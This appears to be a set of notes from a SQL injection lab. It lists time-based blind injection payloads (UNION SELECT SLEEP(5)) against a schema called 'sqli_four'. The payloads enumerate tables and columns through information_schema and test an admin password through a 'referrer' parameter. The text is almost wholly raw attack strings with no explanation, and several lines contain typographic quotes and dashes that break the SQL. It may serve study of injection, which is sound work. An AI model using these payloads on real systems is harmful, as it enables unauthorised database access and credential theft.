admin123' UNION SELECT SLEEP(5),2 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_four' and TABLE_NAME='users' and COLUMN_NAME like 'password%';
referrer=admin123' UNION SELECT SLEEP(5),2 from users where username like 'admin' and password like '4961';

or
admin123' UNION SELECT SLEEP(5),2 FROM information_schema.tables WHERE table_schema = ‘sqli_four’ and table_name like ‘a%’; —

admin123' UNION SELECT SLEEP(5),2 FROM information_schema.tables WHERE table_schema = ‘sqli_four’ and table_name=’users’; —

admin123' UNION SELECT SLEEP(5),2 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA=’sqli_four’ and TABLE_NAME=’users’ and COLUMN_NAME like ‘u%’ and COLUMN_NAME !=’id’;
